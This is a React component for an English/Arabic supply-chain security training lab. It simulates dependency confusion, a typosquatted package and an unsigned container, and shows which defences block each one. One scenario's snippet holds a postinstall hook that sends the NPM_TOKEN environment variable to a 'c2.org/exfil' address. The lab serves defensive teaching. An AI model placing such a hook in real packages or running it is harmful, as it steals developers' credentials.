import React, { useState, useMemo } from 'react';
import {
  Package,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Zap,
  Terminal,
  FileCode,
  Play,
  RefreshCw,
  Lock,
  Unlock,
  AlertTriangle,
  GitBranch,
  Layers,
  Box,
} from 'lucide-react';

interface DependencyConfusionLabProps {
  language?: 'ar' | 'en';
}

interface PoisonScenario {
  id: string;
  nameEn: string;
  nameAr: string;
  category: 'DEPENDENCY_CONFUSION' | 'POSTINSTALL_TYPOSQUAT' | 'UNSIGNED_CONTAINER';
  packageJsonSnippet: string;
  registryTarget: string;
  descriptionEn: string;
  descriptionAr: string;
  isThreat: boolean;
}

const POISON_SCENARIOS: PoisonScenario[] = [
  {
    id: 'SC-01',
    nameEn: 'Dependency Confusion Namespace Hijack (@corp/payment-sdk)',
    nameAr: 'استغلال خلط التبعيات Dependency Confusion على NPM العام',
    category: 'DEPENDENCY_CONFUSION',
    packageJsonSnippet: `"dependencies": {
    "@corp-internal/payment-vault": "99.1.0" // Public NPM hijack version takes precedence!
}`,
    registryTarget: 'Public Registry (registry.npmjs.org)',
    descriptionEn: 'Attacker registers internal company package name on public npm with version 99.1.0; pip/npm resolves to malicious public mirror.',
    descriptionAr: 'المهاجم يسجل اسم الحزمة الداخلية للشركة على المستودع العام برقم إصدار 99.1.0 مما يجبر أنظمة البناء على تنزيل نسخته الخبيثة.',
    isThreat: true,
  },
  {
    id: 'SC-02',
    nameEn: 'Typosquatting Package with Malicious Post-Install Hook',
    nameAr: 'التحايل الإملائي Typosquatting وتنفيذ أوامر postinstall الخبيثة',
    category: 'POSTINSTALL_TYPOSQUAT',
    packageJsonSnippet: `"name": "cross-env-utils",
"scripts": {
    "postinstall": "node -e 'require(\\"http\\").get(\\"http://c2.org/exfil?token=\\"+process.env.NPM_TOKEN)'"
}`,
    registryTarget: 'Public NPM / PyPI Mirror',
    descriptionEn: 'Misspelled library executed postinstall hook upon npm install in developer terminal, stealing environment secrets.',
    descriptionAr: 'حزمة ذات اسم محرف إملائياً تشغل سكريبت ما بعد التثبيت فوراً عند npm install وتسرق رموز التوكن من النظام.',
    isThreat: true,
  },
  {
    id: 'SC-03',
    nameEn: 'Unsigned Production Container Image Injection',
    nameAr: 'حقن حاوية Docker غير موقعة في بيئة الإنتاج الكبرى',
    category: 'UNSIGNED_CONTAINER',
    packageJsonSnippet: `docker pull registry.corp.local/api-gateway:latest
// SHA256 mismatch: Container binary backdoored with reverse shell listener`,
    registryTarget: 'Internal Docker Registry / Harbor',
    descriptionEn: 'Untrusted container image pushed without cryptographic Sigstore Cosign signature, bypassing integrity validation.',
    descriptionAr: 'رفع صورة حاوية معدلة بدون توقيع Sigstore Cosign الرقمي، مما يتيح تشغيل برمجية تجسس في حاويات الإنتاج.',
    isThreat: true,
  },
];

export const DependencyConfusionLab: React.FC<DependencyConfusionLabProps> = ({ language = 'en' }) => {
  const isAr = language === 'ar';

  const [selectedScenarioId, setSelectedScenarioId] = useState<string>('SC-01');
  const [isBuilding, setIsBuilding] = useState<boolean>(false);
  const [buildLog, setBuildLog] = useState<{
    status: 'SUPPLY_CHAIN_SECURED' | 'SUPPLY_CHAIN_POISONED';
    buildOutput: string;
    actionDetails: string;
    activeDefenses: string[];
  } | null>(null);

  // DevSecOps Supply Chain Defenses
  const [defenseScopedRegistryLock, setDefenseScopedRegistryLock] = useState<boolean>(false);
  const [defenseIgnoreScriptsFlag, setDefenseIgnoreScriptsFlag] = useState<boolean>(false);
  const [defenseSigstoreCosignVerify, setDefenseSigstoreCosignVerify] = useState<boolean>(false);

  const scenario = useMemo(
    () => POISON_SCENARIOS.find((p) => p.id === selectedScenarioId) || POISON_SCENARIOS[0],
    [selectedScenarioId]
  );

  const handleRunBuildPipeline = () => {
    setIsBuilding(true);
    setBuildLog(null);

    setTimeout(() => {
      const activeDefenses: string[] = [];
      let isBlocked = false;

      if (scenario.category === 'DEPENDENCY_CONFUSION' && defenseScopedRegistryLock) {
        activeDefenses.push('Strict .npmrc Scoped Registry Pinning: @corp-internal strictly routed to private Artifactory');
        isBlocked = true;
      } else if (scenario.category === 'POSTINSTALL_TYPOSQUAT' && defenseIgnoreScriptsFlag) {
        activeDefenses.push('CI/CD Enforced Flag: npm install --ignore-scripts (Execution of hooks blocked)');
        isBlocked = true;
      } else if (scenario.category === 'UNSIGNED_CONTAINER' && defenseSigstoreCosignVerify) {
        activeDefenses.push('Sigstore Cosign Admission Controller: Reject unsigned OCI container images in cluster');
        isBlocked = true;
      }

      if (isBlocked) {
        setBuildLog({
          status: 'SUPPLY_CHAIN_SECURED',
          buildOutput: isAr
            ? '[تم تأمين سلسلة التوريد البرمجية بنجاح] تم حظر الحزمة الخبيثة أو رفض الصورة غير الموقعة في خط الإنتاج.'
            : '[SUPPLY CHAIN SECURED] Malicious package rejected by scoped registry lock or unsigned container dropped.',
          actionDetails: isAr ? 'خط أنابيب CI/CD آمن بنسبة 100%: لم يتم تسريب أي أسرار أو تثبيت برمجيات دخيلة.' : 'Pipeline intact. Zero token exfiltration.',
          activeDefenses,
        });
      } else {
        setBuildLog({
          status: 'SUPPLY_CHAIN_POISONED',
          buildOutput: isAr
            ? `[تسميم خط الإنتاج!] تم تثبيت الحزمة الخبيثة بنجاح: ${scenario.packageJsonSnippet}`
            : `[SUPPLY CHAIN COMPROMISED]: Backdoored package resolved from public repository: ${scenario.packageJsonSnippet}`,
          actionDetails: isAr
            ? 'تحذير: تم اختراق خط الإنتاج CI/CD وتسريب أسرار البيئة عبر الحزمة المشبوهة!'
            : 'CRITICAL SUPPLY CHAIN POISON: Malicious postinstall script executed or rogue image admitted!',
          activeDefenses: [],
        });
      }

      setIsBuilding(false);
    }, 400);
  };

  return (
    <div className="flex-1 flex flex-col h-full bg-slate-950 text-slate-100 overflow-y-auto p-4 space-y-4 font-mono select-none">
      {/* Header Banner */}
      <div className="bg-slate-900 border border-slate-800 rounded-lg p-4 flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="p-2.5 bg-amber-500/10 border border-amber-500/30 rounded-lg text-amber-400">
            <Package className="w-6 h-6" />
          </div>
          <div>
            <h2 className="text-lg font-bold text-slate-100 flex items-center gap-2">
              {isAr ? 'مختبر أمان سلسلة التوريد البرمجية وخلط التبعيات (Dependency Confusion & Supply Chain)' : 'Supply Chain & Dependency Confusion Security Laboratory'}
              <span className="px-2 py-0.5 text-[10px] text-amber-400 bg-amber-950/60 border border-amber-800 rounded-full font-mono">
                SLSA Level 3 / Sigstore Cosign
              </span>
            </h2>
            <p className="text-xs text-slate-400 mt-0.5">
              {isAr
                ? 'محاكاة هجمات خلط التبعيات، وتسميم حزم NPM/PyPI، والتلاعب بصور الحاويات غير الموقعة.'
                : 'Interactive Dependency Confusion simulation, postinstall typosquatting, and Sigstore cryptographic verification.'}
            </p>
          </div>
        </div>

        <div className="flex items-center gap-2 text-xs text-slate-400">
          <span>{isAr ? 'حالة خط الإنتاج:' : 'CI/CD Pipeline State:'}</span>
          <span className="px-2 py-1 bg-amber-950 border border-amber-800 text-amber-300 rounded font-bold">
            BUILD AGENT RUNNING
          </span>
        </div>
      </div>

      {/* Main Grid: Attack Vector Selection + Manifest Code Screen */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-4 flex-1">
        {/* Left Column: Attack Vector Selector + Defenses */}
        <div className="lg:col-span-5 bg-slate-900/80 border border-slate-800 rounded-lg p-4 flex flex-col space-y-3">
          <h3 className="text-sm font-bold text-slate-200 flex items-center gap-2 uppercase tracking-wider">
            <Zap className="w-4 h-4 text-amber-400" />
            {isAr ? 'سيناريوهات تسميم سلسلة التوريد' : 'Supply Chain Attack Vectors'}
          </h3>

          <div className="space-y-2 overflow-y-auto max-h-[320px] pr-1">
            {POISON_SCENARIOS.map((sc) => {
              const isSelected = sc.id === selectedScenarioId;
              return (
                <button
                  key={sc.id}
                  onClick={() => setSelectedScenarioId(sc.id)}
                  className={`w-full text-left p-3 rounded-lg border text-xs transition-all flex flex-col space-y-1.5 ${
                    isSelected
                      ? 'bg-amber-950/50 border-amber-500 text-slate-100 shadow-md shadow-amber-950/40'
                      : 'bg-slate-950/60 border-slate-800/80 text-slate-400 hover:border-slate-700 hover:text-slate-200'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-amber-300">{sc.id}</span>
                    <span className="px-1.5 py-0.5 text-[9px] bg-slate-900 border border-slate-800 text-slate-300 rounded font-semibold">
                      {sc.category}
                    </span>
                  </div>
                  <span className="font-semibold text-slate-200">{isAr ? sc.nameAr : sc.nameEn}</span>
                  <p className="text-[11px] text-slate-400 line-clamp-2 leading-relaxed">
                    {isAr ? sc.descriptionAr : sc.descriptionEn}
                  </p>
                </button>
              );
            })}
          </div>

          {/* DevSecOps Defenses */}
          <div className="pt-3 border-t border-slate-800 space-y-2">
            <h4 className="text-xs font-bold text-emerald-400 flex items-center gap-2 uppercase tracking-wider">
              <Shield className="w-4 h-4 text-emerald-400" />
              {isAr ? 'دروع حماية خط أنابيب CI/CD' : 'Supply Chain Security Controls'}
            </h4>

            <div className="space-y-2 text-xs">
              <label className="flex items-center justify-between p-2 bg-slate-950 border border-slate-800 rounded cursor-pointer hover:border-slate-700">
                <span className="text-slate-300">{isAr ? 'حصر النطاق الخاص في .npmrc وتجنب العام' : 'Strict Scoped Registry Binding (.npmrc Lock)'}</span>
                <input
                  type="checkbox"
                  checked={defenseScopedRegistryLock}
                  onChange={(e) => setDefenseScopedRegistryLock(e.target.checked)}
                  className="rounded border-slate-700 bg-slate-900 text-amber-500 focus:ring-0"
                />
              </label>

              <label className="flex items-center justify-between p-2 bg-slate-950 border border-slate-800 rounded cursor-pointer hover:border-slate-700">
                <span className="text-slate-300">{isAr ? 'تعطيل سكريبتات postinstall بتمرير --ignore-scripts' : 'Enforce npm --ignore-scripts Flag'}</span>
                <input
                  type="checkbox"
                  checked={defenseIgnoreScriptsFlag}
                  onChange={(e) => setDefenseIgnoreScriptsFlag(e.target.checked)}
                  className="rounded border-slate-700 bg-slate-900 text-amber-500 focus:ring-0"
                />
              </label>

              <label className="flex items-center justify-between p-2 bg-slate-950 border border-slate-800 rounded cursor-pointer hover:border-slate-700">
                <span className="text-slate-300">{isAr ? 'اشتراط توقيع الحاويات الرقمي بـ Sigstore Cosign' : 'Mandate Sigstore Cosign Image Signatures'}</span>
                <input
                  type="checkbox"
                  checked={defenseSigstoreCosignVerify}
                  onChange={(e) => setDefenseSigstoreCosignVerify(e.target.checked)}
                  className="rounded border-slate-700 bg-slate-900 text-amber-500 focus:ring-0"
                />
              </label>
            </div>
          </div>
        </div>

        {/* Right Column: Build Terminal Screen */}
        <div className="lg:col-span-7 bg-slate-900/80 border border-slate-800 rounded-lg p-4 flex flex-col space-y-4">
          <div className="flex items-center justify-between border-b border-slate-800 pb-2">
            <h3 className="text-sm font-bold text-slate-200 flex items-center gap-2">
              <Terminal className="w-4 h-4 text-amber-400" />
              {isAr ? 'شاشة فحص وتثبيت الحزم في CI/CD' : 'Package Resolution & Build Console'}
            </h3>
            <button
              onClick={handleRunBuildPipeline}
              disabled={isBuilding}
              className="px-4 py-1.5 bg-amber-600 hover:bg-amber-500 text-white rounded text-xs font-bold transition-all flex items-center gap-2 shadow border border-amber-400/30 disabled:opacity-50"
            >
              {isBuilding ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5 fill-current" />}
              {isAr ? 'بدء تشغيل خط الإنتاج' : 'Run Build Pipeline'}
            </button>
          </div>

          <div className="bg-slate-950 border border-slate-800 rounded p-3 text-xs font-mono space-y-1">
            <span className="text-slate-400 font-bold block">{isAr ? 'المستودع المستهدف بالتثبيت:' : 'Target Registry Host:'}</span>
            <span className="text-amber-400 font-bold">{scenario.registryTarget}</span>
          </div>

          <div className="bg-slate-950 border border-slate-800 rounded p-3 text-xs font-mono space-y-1">
            <span className="text-slate-400 font-bold block">{isAr ? 'ملف تعريف التبعيات (package.json):' : 'Package Manifest Snippet:'}</span>
            <pre className="p-2 bg-slate-900 border border-slate-800 text-amber-300 rounded text-[11px] overflow-x-auto">
              {scenario.packageJsonSnippet}
            </pre>
          </div>

          {/* Build Output Log */}
          <div className="flex-1 bg-slate-950 border border-slate-800 rounded-lg p-4 flex flex-col space-y-3 min-h-[160px]">
            <div className="flex items-center justify-between border-b border-slate-800/80 pb-2 text-xs">
              <span className="font-bold text-slate-300">{isAr ? 'سجل تشغيل خط البناء CI/CD' : 'Build Agent Execution Stream'}</span>
            </div>

            {buildLog ? (
              <div className="space-y-3 text-xs font-mono">
                <div
                  className={`p-3 rounded border ${
                    buildLog.status === 'SUPPLY_CHAIN_SECURED'
                      ? 'bg-emerald-950/40 border-emerald-800 text-emerald-300'
                      : 'bg-rose-950/50 border-rose-800 text-rose-200'
                  }`}
                >
                  <div className="font-bold mb-1 flex items-center gap-2">
                    {buildLog.status === 'SUPPLY_CHAIN_SECURED' ? (
                      <>
                        <ShieldCheck className="w-4 h-4 text-emerald-400" />
                        <span>{isAr ? 'تم حماية سلسلة التوريد بنجاح' : 'SUPPLY CHAIN VERIFIED & SAFE'}</span>
                      </>
                    ) : (
                      <>
                        <ShieldAlert className="w-4 h-4 text-rose-400" />
                        <span>{isAr ? 'إنذار: تم اختراق خط الإنتاج وتسميم الحزم!' : 'SUPPLY CHAIN POISONING EXPLOITED'}</span>
                      </>
                    )}
                  </div>
                  {buildLog.buildOutput}
                </div>

                <div className="p-2.5 bg-slate-900 border border-slate-800 text-slate-300 rounded text-[11px]">
                  {buildLog.actionDetails}
                </div>
              </div>
            ) : (
              <div className="flex-1 flex flex-col items-center justify-center text-slate-500 space-y-2 py-8">
                <Package className="w-8 h-8 text-slate-600 animate-pulse" />
                <p className="text-xs">
                  {isAr
                    ? 'اختر سيناريو وانقر على "بدء تشغيل خط الإنتاج" لمعاينة استجابة دفاعات سلسلة التوريد.'
                    : 'Select a supply chain scenario and click "Run Build Pipeline".'}
                </p>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
